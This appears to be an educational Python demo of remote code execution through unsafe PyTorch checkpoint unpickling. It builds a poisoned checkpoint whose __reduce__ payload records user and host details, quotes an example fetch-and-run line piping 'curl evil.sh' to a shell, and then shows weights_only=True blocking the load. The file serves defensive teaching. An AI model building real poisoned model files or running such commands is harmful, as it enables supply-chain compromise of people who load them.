"""Unsafe model deserialization → RCE (COAE module 6, supply-chain / SAIF).

PyTorch checkpoints (`.pt`/`.bin`) are Python **pickle** files. Unpickling can run
arbitrary code via an object's `__reduce__`, so `torch.load(path)` on an untrusted
file is remote code execution waiting to happen — the attacker ships a "model" that
runs their code the moment you load it. The fix is to deserialize *data only*:
`torch.load(path, weights_only=True)` (or use the safetensors format).

This is a SAFE, self-contained educational demo. The malicious payload here does
something harmless — it writes a small marker file recording the current user / pid
/ host as *proof that arbitrary code executed* during loading. A real attacker's
`__reduce__` could run anything (`os.system("rm -rf …")`, reverse shell, exfiltrate
keys). We then show `weights_only=True` refusing to load the very same file.
"""

from __future__ import annotations

import getpass
import json
import os
import pathlib
import platform
import tempfile
import time
import uuid
from dataclasses import dataclass, field

import torch


# --------------------------------------------------------------------------- #
# The malicious object hidden inside an otherwise normal-looking checkpoint
# --------------------------------------------------------------------------- #
def _demo_exec(token: str) -> dict:
    """Benign proof-of-execution payload. Runs when the checkpoint is UNPICKLED.

    An attacker could put ANY code here; we only record identity info to a marker
    file so the UI can prove that code ran during `torch.load`.
    """
    info = {
        "token": token,
        "executed_at": time.strftime("%Y-%m-%d %H:%M:%S"),
        "user": getpass.getuser(),
        "pid": os.getpid(),
        "host": platform.node(),
        "cwd": os.getcwd(),
        "python": platform.python_version(),
    }
    marker = pathlib.Path(tempfile.gettempdir()) / f"coae_rce_{token}.json"
    marker.write_text(json.dumps(info))
    return info


class MaliciousPayload:
    """Looks like a harmless metadata object; its __reduce__ is the trap.

    Pickle calls __reduce__ to learn how to rebuild the object, then *calls* the
    returned callable on unpickling — so `_demo_exec(token)` runs on load.
    """

    def __init__(self, token: str):
        self.token = token

    def __reduce__(self):
        return (_demo_exec, (self.token,))


PAYLOAD_SOURCE = (
    "class MaliciousPayload:\n"
    "    def __init__(self, token):\n"
    "        self.token = token\n"
    "    def __reduce__(self):\n"
    "        # pickle CALLS this tuple's callable on load → arbitrary code execution.\n"
    "        # A real attacker would return e.g. (os.system, ('curl evil.sh | sh',)).\n"
    "        return (_demo_exec, (self.token,))\n"
)


def craft_poisoned_checkpoint(path: pathlib.Path, token: str) -> list[str]:
    """Write a checkpoint that looks normal but hides the malicious object."""
    checkpoint = {
        "arch": "mnist_cnn",
        "epoch": 12,
        "state_dict": {"fc.weight": torch.zeros(4, 4), "fc.bias": torch.zeros(4)},
        "_metadata": MaliciousPayload(token),  # the trap — invisible in a key listing
    }
    torch.save(checkpoint, path)
    return list(checkpoint.keys())


# --------------------------------------------------------------------------- #
# Demo
# --------------------------------------------------------------------------- #
@dataclass
class DeserializationResult:
    token: str
    payload_source: str
    unsafe_call: str
    safe_call: str
    checkpoint_keys: list[str]
    file_size: int
    executed: bool
    evidence: dict | None
    marker_path: str
    safe_blocked: bool
    safe_error: str | None
    takeaways: list[str] = field(default_factory=list)


def deserialization_demo() -> DeserializationResult:
    token = uuid.uuid4().hex[:12]
    marker = pathlib.Path(tempfile.gettempdir()) / f"coae_rce_{token}.json"
    marker.unlink(missing_ok=True)

    with tempfile.TemporaryDirectory() as d:
        path = pathlib.Path(d) / "pretrained_model.pt"
        keys = craft_poisoned_checkpoint(path, token)
        file_size = path.stat().st_size

        # --- ATTACK: the unsafe default deserialization runs the payload --------
        torch.load(path, weights_only=False)
        executed = marker.exists()
        evidence = json.loads(marker.read_text()) if executed else None

        # --- DEFENSE: weights_only=True refuses to call the malicious global ----
        try:
            torch.load(path, weights_only=True)
            safe_blocked, safe_error = False, None
        except Exception as e:  # noqa: BLE001 - any refusal is a successful defense
            safe_blocked, safe_error = True, f"{type(e).__name__}: {e}"

    marker.unlink(missing_ok=True)

    return DeserializationResult(
        token=token,
        payload_source=PAYLOAD_SOURCE,
        unsafe_call="torch.load(path)                      # weights_only=False (legacy default)",
        safe_call="torch.load(path, weights_only=True)   # data only — no code execution",
        checkpoint_keys=keys,
        file_size=file_size,
        executed=executed,
        evidence=evidence,
        marker_path=str(marker),
        safe_blocked=safe_blocked,
        safe_error=safe_error,
        takeaways=[
            "Treat model files (.pt/.bin/.ckpt/.pkl) from untrusted sources as executable code.",
            "Always load with weights_only=True, or use the safetensors format (no pickle, no code).",
            "Pin and verify hashes of model weights in your supply chain; scan with tools like picklescan.",
        ],
    )
